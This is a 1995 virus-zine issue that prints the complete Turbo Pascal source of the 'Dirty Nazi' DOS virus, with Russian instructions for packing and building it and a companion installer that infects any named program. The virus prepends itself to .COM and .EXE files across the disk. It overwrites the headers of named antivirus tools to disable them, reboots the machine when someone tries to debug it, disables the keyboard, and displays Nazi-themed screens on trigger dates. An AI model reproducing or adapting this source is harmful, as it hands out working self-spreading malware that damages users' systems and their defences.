{     ▄▄                  █
    ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       XII 1995
    ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
     ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▄▀▀▄ █ 
      █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▄▀▀▄ █
      █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ ▀▄▄▀ █
      ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.
 
                                        It's easy to kill a virus, but
                                        it's hard to write it...
                                                           (c) Unknown
}
{ VirusName    :  Dirty Nazi       }
{ Version      :  1.0              }
{ Target       :  *.EXE *.COM      }
{ Stealth      :  No               }
{ TSR          :  No               }
{ Attac Speed  :  Slow             }
{ Danger       :  0                }
{ Effects      :  Yes              }
{ Length       :  8000             }
{ Compiler     :  Turbo Pascal 5.5 }
{ BodyStatus   :  Packed           }
{ Packer       :  Pklite.exe       }

{               * Copyleft  (cl)  Dirty Nazi  1995 *                       }
                  { All suggestions are welcome! }

{ Объяснения по работе -- в конце исходника. После компиляции запыколотить
  (Pklite -e Nazi.EXE), а потом заменить в EXE строчку "Pklite" на "??NAZI",
  а все остальное, включая "Not enough memory", забить мусором, только не 
  трогайте "$", а то работать не будет. И следите за длиной! Если получится 
  меньше 8000, то добейте в EXE мусором до 8000 или по курсу }

{$M 2048 , 0 , 0}

Uses Dos , Crt;

 Const
     Nazi      =  'NAZI';          { Метка вируса }
     VirLen    =  8000;            { Длина упакованого файла }
     RunError  =  #13#10'Abnormal program termination';
     C3        :  Array [1..2] of Byte = (144 , 195);  { А это для }
                                                       { антивирусников: }
                                                       { NOP }
                                                       { RET }
     Message   =  'Virus "Dirty Nazi". Нiякоi хуйнi не робим ми...';
              { Сообщение для тех, кто любит лазить в код }

 Var
    VirIdentifier     :  Array [1..4] of Char;
    VirBody           :  File;
    O1H , O3H  , Br   :  Pointer;
    CmdLine           :  String;
    OurName           :  PathStr;
    I                 :  Integer;
    Dir               :  PathStr;       { переменные для работы }
    Ext               :  ExtStr;
    Name              :  NameStr;
    Target            :  File;
    TargetFile        :  PathStr;
    VirBuf            :  Array [1..VirLen] of Char; { массивы для записи }
    TargetBuf         :  Array [1..VirLen] of Char; { тела вируса и инфици- }
    Attr              :  Word;                      { руемой программы }
    Time              :  LongInt;
    InfFiles          :  Byte;
    DirInfo           :  SearchRec;
    Regs              :  Registers;


 procedure CheckWriteProtect;       { проверка, не стоит ли на диске }
  begin                             { Write Protect }

   Assign(VirBody , '\'+#$FF);     { Invisible file ! }
   ReWrite(VirBody);
   Erase(VirBody);

   If IOResult <> 0 Then
     begin
         WriteLn(RunError);        { Если стоит, то пусть снимут, ато }
         Halt(8);                  { работать не будем }
     end;
 end;

 procedure CheckVirusBody;              { проверка на случай, если нас }
  begin                                 { упаковали каким-нибудь DIET'ом }

      Assign(VirBody , ParamStr(0));
      Reset(VirBody , 1);
      Seek(VirBody , 32);

      BlockRead(VirBody , VirIdentifier , 4);

      Close(VirBody);
                                      { Из тела запущенной программы }
      If VirIdentifier <> Nazi Then   { считываем метку вируса и, если }
       begin                          { таковой не найдено, halt'им }
           WriteLn(RunError);         { программу }
           Halt(8);        { ErrorLevel = 8 , Not Enough Memory! ;-) }
       end;
  end;      { Конец этой увлекательной процедуры }

{$F+}
  procedure ReBoot; Interrupt;
   begin                         { А это для того, чтобы нехорошие дяди }
    InLine($EA/                  { Лозинские не запускали Debug t }
           $00/
           $00/
           $FF/
           $FF);
   end;
{$F-}

{$F+}
  procedure BreakOff; Interrupt;
   begin
              { Invisible Magic Words! }
   end;
{$F-}

 procedure Information;
  begin

      If ParamStr(1)='/??' Then        { Если нам передали вот такой }
       begin                           { параметр, то рассказываем о себе }
          InLine($B4/
                 $01/                              { MOV AH, 01h }
                 $B5/       { Прячем курсор }
                 $20/                              { MOV CH, 20h }
                 $CD/
                 $10);                             { INT 10h }

          TextBackGround(0);
          ClrScr;

          WriteLn(#13#10);

          TextColor(LightGreen);

          WriteLn('  ╔═══════════════════════════════╗');
          WriteLn('  ║ Name             "Dirty Nazi" ║');
          WriteLn('  ║ Type             Virus        ║');
          WriteLn('  ║ Version          1.0          ║');
          WriteLn('  ║ Target           *.COM *.EXE  ║');
          WriteLn('  ║ Stealth          No           ║');
          WriteLn('  ║ TSR              No           ║');
          WriteLn('  ║ Attac speed      Slow         ║');
          WriteLn('  ║ Danger           0            ║');
          WriteLn('  ║ Effects          Yes          ║');
          WriteLn('  ║ Length           ' , VirLen , '         ║');
          WriteLn('  ║ Language         Turbo Pascal ║');
          WriteLn('  ╚═══════════════════════════════╝'#13#10#13#10);

          TextColor(14);
          TextBackGround(9);

          Write('▀▀▀▀▀');           { Украинский флаг }

          TextColor(15);
          TextBackGround(0);

          WriteLn('   Unregistered copy. Please register!');

          InLine($FA/            { CLI }        { System }
                 $F4);           { HLT }        { halted }

       end;
 end;         { end proc }

 procedure Init;                { Процедура инициализации переменных }
  begin                         { программы и проверки условий работы }

     If False Then Write(Message); { Засовываем в код константу Message }

     OurName:=ParamStr(0);     { Имя запущенной программы }

     GetIntVec($01 , O1H);                  { Подготавливаем систему }
     SetIntVec($01 , @ReBoot);              { к принятию вируса: }

     GetIntVec($03 , O3H);                  { Вешаем антитрассировщик }
     SetIntVec($03 , @ReBoot);              { на int 1h и int 3h }

     GetIntVec($1B , Br);                   { заменяем вектор ^C }
     SetIntVec($1B , @BreakOff);
     SetCBreak(False);                      { и отключаем ^C }

     CheckWriteProtect;           { Проверяем, не на Read Only ли диске }
                                  { нас хотели запустить }
     CheckVirusBody;              { Проверяем, не споплюжили ли нам код }

     Information;                 { и не хотят ли Инфо получить }

     InfFiles:=0;
                                  { Инициализируем параметры }
     CmdLine:='';

     Assign(VirBody , ParamStr(0));
     Reset(VirBody , 1);

     BlockRead(VirBody , VirBuf , VirLen);   { Считываем в буфер тело вируса }

     Close(VirBody);

     IF ParamCount <> 0 Then
        Begin
           For I:=1 To ParamCount Do
             CmdLine:=CmdLine + ' ' + ParamStr(I); { считываем параметры }
        End;                                       { в командной строке }

     Dir:='';

 end;   { end proc }

 procedure ExecOriginal;     { Процедура исполнения зараженной программы }
  begin

    FindFirst(ParamStr(0) , AnyFile , DirInfo);  { Получаем полную инфор- }
                                                 { мацию о файле в пере- }
                                                 { менную DirInfo }
    Assign(VirBody , ParamStr(0));

    Time:=DirInfo.Time;          { Запоминаем дату/время и атрибуты файла }
    Attr:=DirInfo.Attr;

    SetFAttr(VirBody , Archive);    { Устанавливаем аттрибут Archive }

    Reset(VirBody , 1);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockRead(VirBody , TargetBuf , VirLen);   { "Лечим" зараженный файл }

    Seek(VirBody , DirInfo.Size - VirLen);
    Truncate(VirBody);

    Seek(VirBody , 0);
    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);
    SetFAttr(VirBody , Attr);

    Close(VirBody);

    SetIntVec($01 , O1H);      { Восстанавливаем захваченные векторы }
    SetIntVec($03 , O3H);
    SetIntVec($1B , Br);

    SwapVectors;
      Exec(GetEnv('COMSPEC') , '/C ' + OurName + CmdLine);  { Исполняем }
    SwapVectors;

    Assign(VirBody , ParamStr(0));
                                                 { Заражаем в обратном }
    SetFAttr(VirBody , Archive);                 { порядке }

    Reset(VirBody , 1);

    BlockWrite(VirBody , VirBuf , VirLen);

    Seek(VirBody , DirInfo.Size - VirLen);

    BlockWrite(VirBody , TargetBuf , VirLen);

    SetFTime(VirBody , Time);         { восстанавливаем дату/время и }
    SetFAttr(VirBody , Attr);         { атрибуты файла }

    Close(VirBody);

 end;   { end proc }

 procedure FuckAntiVirus;       { а это -- для антивирусников }
  begin

    FindFirst(TargetFile , AnyFile , DirInfo); { Получаем инфо о файле в }
                                               { переменную Dirinfo }
    Assign(Target , TargetFile);

    Time:=DirInfo.Time;          { Запоминаем дату/время и }
    Attr:=DirInfo.Attr;          { атрибуты фала }

    SetFAttr(Target , Archive);   { Устанавливаем Archive }

    Reset(Target , 1);

    BlockWrite(Target , C3 , 2); { заменяем сигнатуру MZ на NOP , RET }

    SetFTime(Target , Time);    { восстанавливаем дату/время и }
    SetFAttr(Target , Attr);    { атрибуты файла }

    Close(Target);              { теперь антивирусник будет после вызова }
                                { сразу же красиво возвращать управление }
  end;    { end proc }          { системе }

 procedure FindTarget(Dir : PathStr);   { процедура поиска жертвы }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean;    { функция, проверяющая файл на }
  begin                              { зараженность }

     VirusPresent:=False;

     Assign(Target , TargetFile);
     Reset(Target , 1);

     Seek(Target , 32);
     BlockRead(Target , VirIdentifier , 4);

     If VirIdentifier = Nazi Then    { Если есть метка, то есть и вирус }
      VirusPresent:=True;

 end;  { end func }

 procedure InfectFile;   { процедура заражения файла }
  begin

   If (((Ext = '.COM') And ((Sr.Size < 20000) Or (Sr.Size > 50000)))) Then Exit;
   If Sr.Name = 'COMMAND.COM' Then Exit;
   If Sr.Name = 'IBMBIO.COM' Then Exit;   { проверяем файлы, которые заражать }
   If Sr.Name = 'IBMDOS.COM' Then Exit;   { не надо }
   If ((Ext = '.EXE') And (Sr.Size < VirLen)) Then Exit;

   If Not VirusPresent Then      { если файл уже не заражен, }
    begin                        { то заразим его }

       Time:=Sr.Time;          { сохраняем дату/время и }
       Attr:=Sr.Attr;          { атрибуты файла }

       Assign(Target , TargetFile);
       SetFAttr(Target, Archive);   { Устанавливаем Archive }
       Reset(Target , 1);

       BlockRead(Target , TargetBuf , VirLen);

       Seek(Target , 0);
       BlockWrite(Target, VirBuf, VirLen);
                                                   { заражаем }
       Seek(Target , Sr.Size);
       BlockWrite(Target , TargetBuf , VirLen);

       SetFAttr(Target , Attr);     { восстанавливаем дату/время и }
       SetFTime(Target , Time);     { атрибуты файла }

       Close(Target);

       Inc(InfFiles);               { увеличиваем счетчик зараженных }
                                    { файлов }
    end;
 end;    { end proc }

 procedure CheckAnti;          { процедура проверки, не антивирусник ли }
  begin                        { нам попался }

    If (Name = 'AIDSTEST') Or
       (Name = 'TESTAIDS') Or
       (Name = 'DRWEB')    Or
       (Name = 'WEB')      Or
       (Name = 'ADINF')    Or
       (Name = 'ADINFEXT') Then FuckAntiVirus Else InfectFile;
  end;

  begin

      Dir:=Dir + '\';         { устанавливаем корневой каталог }

      FindFirst(Dir + '*.*', AnyFile , Sr);
       While DosError = 0 Do
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Dir + Sr.Name;   { имя и путь к найденному файлу }

 { Полу- } Ext:=Copy(Sr.Name , Length(Sr.Name) - 3 , Length(Sr.Name));
 { чаем }  Name:=Copy(Sr.Name , 1 , Length(Sr.Name) - Length(Ext));
 { имя и расширение найденного файла }
           If Ext = '.EXE' Then CheckAnti;  { Если .EXE или .COM -- тогда }
           If Ext = '.COM' Then CheckAnti;  { начинаем процесс заражения }

           If InfFiles > 1 Then Exit;       { если заразили 2 файла -- }
                                            { заканчиваем работу }
           FindNext(Sr);

         end;


      FindFirst(Dir + '*.*' , AnyFile , Sr);
       While DosError = 0 Do
        begin

          If (Sr.Name[1] <> '.') And (Sr.Attr = Directory) Then
             FindTarget(Dir + Sr.Name);

         FindNext(Sr);

       end;
  end;      { end proc }

{$F+}
 procedure Int09h;  Interrupt;
   begin
                { Пустая процедура для отключения клавиатуры }
   end;
{$F-}

 procedure Cross;   { Процедура размножения креста на экране }

  Var
     J , X , Y  :  Byte;

 procedure WriteCross;  { Процедура рисования креста ОДИН раз на экране }
  begin

        Write('█   █▀▀▀▀');
        If Y > 2 Then Inc(Y);
        GoToXY(X , Y + 1);
        Write('█   █');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('▀▀▀▀█▀▀▀█');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('    █   █');
        Inc(Y);
        GoToXY(X , Y + 1);
        Write('▀▀▀▀▀   ▀');

  end; { end proc }

  begin

    InLine($B4/
           $01/
           $B5/       { Hide cursor }
           $20/
           $CD/
           $10);

    HighVideo;

    TextBackGround(4);  { Красный фон }
    TextColor(0);       { черный цвет }
    ClrScr;

   X:=3;
   Y:=1;

   For I:=1 To 6 Do
    begin
      GoToXY(X , Y);
      For J:=1 To 5 Do          { заполняем экран крестами }
       begin
           WriteCross;
        Inc(Y);
        GoToXY(X , Y + 1);
       end;
      Y:=1;
      X:=X + 13;
    end;
    Intr($5 , Regs);           { и заодно выводим их на принтер }

  end;   { end proc }

 procedure Augustin;     { А это процедура исполнения известной мелодии }

   Var
      T      :  Array [1..12] of Integer;
      Kt     :  Array [1..48] of Integer;
      L , Q  :  Integer;

 begin

  Q := 200;

  T[1]:=131; T[2]:=139; T[3]:=147; T[4]:=156; T[5]:=165;
  T[6]:=175; T[7]:=185; T[8]:=196; T[9]:=208; T[10]:=220;
  T[11]:=223; T[12]:=247;

  For L:=1 To 12 Do Kt[L]:=T[L] Div 2;
  For L:=1 To 12 Do Kt[L + 12]:=T[L];
  For L:=1 To 12 Do Kt[L + 24]:=2 * T[L];
  For L:=1 To 12 Do Kt[L + 36]:=4 * T[L];

  Repeat

    Sound(Kt[32]); Delay(3 * Q); NoSound;
    Sound(Kt[34]); Delay(Q); NoSound;
    Sound(Kt[32]); Delay(q); NoSound;
    Sound(Kt[30]); Delay(q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[27]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[32]); Delay(3 * q); NoSound;
    Sound(Kt[34]); Delay(q); NoSound;
    Sound(Kt[32]); Delay(q); NoSound;
    Sound(Kt[30]); Delay(q); NoSound;
    Sound(Kt[29]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(2 * q); NoSound;
    Sound(Kt[27]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[20]); Delay(2 * q); NoSound;
    Sound(Kt[25]); Delay(q); NoSound;
    Delay(5 * q);

  Until False;

 end;      { end proc }

 procedure CheckDateAndTime;  { процедура проверки даты/времени }

  Var
    H , M , S , Ms : Word;         { Работа по аналогии с песней }
                                   { "22 июня ровно в 4 часа }
  begin                            {  ^^ ^^^^ ^^^^^   ^      }
                                   { Киев бомбили, нам объявили }
   GetTime(H , M , S , Ms);        { Что началася война" }

   If (((H = 4) And (M = 0)) Or ((H = 16) And (M = 0))) Then
      begin
         SetIntVec($09 , @Int09h);  { Если ровно 4:00 или 16:00 }
         Cross;                     { то рисуем кресты и играем }
         Augustin;                  { мелодию }
      end;

   GetDate(H , M , S , Ms);

   If ((M = 6) And (S = 22)) Then     { Если 22 июня, то }
      begin

         InLine($B4/
                $01/
                $B5/              { hide cursor }
                $20/
                $CD/
                $10);

         SetIntVec($09 , @Int09h);  { hook int 09h }

         TextColor(15);
         TextBackGround(0);
         ClrScr;


         WriteLn(#13#10);
         WriteLn(' ╔══════════════════════════════════╗');
         WriteLn(' ║ Dirty Nazi Virus. Nazi not dead! ║');
         WriteLn(' ║ Hi, Dummies!  Glad to  infect u! ║'); { выводим }
         WriteLn(' ║ [22/06]. Today is my holiday & I ║'); { информацию }
         WriteLn(' ║ want u to have a rest.  Relax, I ║'); { о вирусе }
         WriteLn(' ║ will  not  destroy  your  data!  ║');
         WriteLn(' ╠══════════════════════════════════╣');
         WriteLn(' ║        Type /?? for help         ║');
         WriteLn(' ╚══════════════════════════════════╝');

         Delay(20000);                          { ждем, пока прочтут }

         Cross;                         { кресты и мелодия }
         Augustin;

      end;

  end;  { end proc }


 begin  { * MAIN * }

     Init;                    { Инициализируемся }

     FindTarget(Dir);         { Ищем жертвы и заражаем их }

     CheckDateAndTime;        { Не пора ли нам показать себя ? }

     ExecOriginal;            { Исполняем зараженную программу }

 end.   { * ВОТ И ВСЕ, ВОТ И НАЧАЛСЯ ЛЕТОВ... * }

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     Этот нерезидентный .COM.EXE является моим первым и, я надеюсь, не
последним детищем. Asm я знаю недостаточно хорошо, можно даже сказать,
достаточно нехорошо, поэтому писан он на Паскале и ужат Pklite.  Неко-
торые комментарии по работе программы:
     Заражает все  .COM.EXE файлы на текущем диске, записывается в на-
чало, оригинальное начало переносит в конец файла.  В  DOS'е  работает
корректно, в Форточках не тестировал. При заражении  циклически  обхо-
дит текущий диск начиная с корневого каталога. После заражения 2х фай-
лов отдает управление носителю. Не заражает файлы меньше VirLength (а-
то лажа получится при работе: мусор в буфере,  программа  в  нокдауне,
юзер в панике etc.) и .COM файлы Length <  20000  (ибо  сильно заметно
приращение длины) & Length > 50000  (чтоб  не  получилась .COM Length,
например, 70000). Принцип заражения взят из вируса Inna  2.x,  выражаю
огромную благодарность автору. НЕ заражает  COMMAND.COM  (по  понятным
соображениям), не заражает файлы IBMBIO.COM, IBMDOS.COM (кстати,  вир-
мэйкеры, обратите внимание, если вы  отменяете  заражение  AIDSTEST  &
DRWEB, отменяйте плз эти два COMа тоже, работать корректней будет, ато
проверял я у себя Zipper, а потом нажал комбинацию из трех  пальцев  и
все -- пу-пу настало -- Nowell бы и рад  загрузиться,  да  не  может).
Антивирусы не заражает, а заменяет сигнатуру 'MZ' на NOP, RET --  вер-
нуть управление системе. И восстановить всегда можно, и мне приятно...
При передаче управления носителю "лечит" его, а потом заражает по  но-
вой. Дабы не поражать файл дважды, пользуется  меткой  'NAZI',  причем
читает ее прямо из EXE-header'а (отчего б не юзануть Pklit'овский  (c)
раз уж от там есть?). С диска, на котором установлен WriteProtect,  не
запускается, а выдает фразу 'Abnormal program termination'  и  возвра-
щает управление в ДОС с ErrorLevel = 'Not enough memory'. Для тех, кто
любит в HEX-режиме лазить в чужие программы, содержит цитату  из "Гам-
лїта украинской редакции", помещенную в константе Message. Если  зара-
женная программа запускается в 4:00 или в 16:00, то  вирус  управления
ей не отдает, а выводит на экран в текстовом режиме  картинку,  делает
Print Screen и играет известную мелодию. Аналогичные действия произво-
дит при запуске 22 июня. Содержит хоть и примитивные, но зато уже  ан-
тидебагерные приемы: при попытке трассировки программой  DEBUG  с  оп-
цией t перегружает систему. НЕ СТОИТ из названия  программы  создавать
ошибочное представление об авторе -- никакого ущемленного самолюбия  у
меня нет, в детстве меня товарищи не обижали, и фашистских  наклоннос-
тей у меня тоже не замечается, и вирус этот, кстати, не несет  НИКАКОЙ
деструкции, а очень даже наоборот, старается  корректно  работать  при
всех условиях, разве что перед заражением не  выдает  на  экран  фразу
"D'you want this file to be infected (Y/N) ?".
     Вроде бы ничего не забыл, а если что и забыл -- сами разберетесь,
смотрите исходник.

P.S. Перед компиляцией в меню Options/Compiler все, что возможно, пос-
тавить на Off (вроде I/O Checking, Range Checking и т.д.), но оставить
On эмуляцию матсопроцессора.

P.S.S. Да, кстати, откомпилированный вирус лучше не запускать напрямую,
а заразить какую-то программу, используя инсталлятор, описанный  ниже.
Пользоваться инсталлятором следующим образом:

   Install.Exe Имя_Откомпилированного_Вируса.EXE Имя_Любой_Программы
                     ( Не забывайте о размерах ! )

                                                       (cl) Dirty Nazi
Program Install;
Uses Dos;
                                   { Пардон за отсутствие комментариев, но, }
                                   { по-моему, тут и комментировать нечего }
 Const
     VirLen  =  8000;

 Var
   DirInfo  :  SearchRec;
   BufFrom  :  Array [1..VirLen] of Char;
   BufTo    :  Array [1..VirLen] of Char;
   FromF    :  File;
   ToF      :  File;

 begin  { * MAIN * }

  If ParamCount <> 2 Then
    begin
       WriteLn(#13#10'- Required parameters missing'#13#10);
       Halt;
    end;

  FindFirst(ParamStr(1) , AnyFile , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(1) , '" not found!'#13#10);
        Halt;
     end;

  Assign(FromF , ParamStr(1));
  Reset(FromF , 1);

  FindFirst(ParamStr(2) , Archive , DirInfo);
   If DosError <> 0 Then
     begin
        WriteLn(#13#10'File "' , ParamStr(2) , '" not found or not Archive');
        WriteLn('Set Archive attribute then try again'#13#10);
        Halt;
     end;

  Assign(ToF , ParamStr(2));
  Reset(ToF , 1);

  Seek(FromF , 0);
  Seek(ToF , 0);

  BlockRead(FromF , BufFrom , VirLen);
  BlockRead(ToF , BufTo , VirLen);

  Seek(ToF , 0);
  BlockWrite(ToF , BufFrom , VirLen);

  Seek(ToF , DirInfo.Size);
  BlockWrite(ToF , BufTo , VirLen);

  Close(FromF);
  Close(ToF);

  WriteLn(#13#10'Infection completed. Copyleft (cl) Dirty Nazi 1995');
  WriteLn('"' , ParamStr(2) , '" now infected by Dirty Nazi Virus v.1.0'#13#10);

 end.  { * WAR IS OVER (IF U WANT IT) * }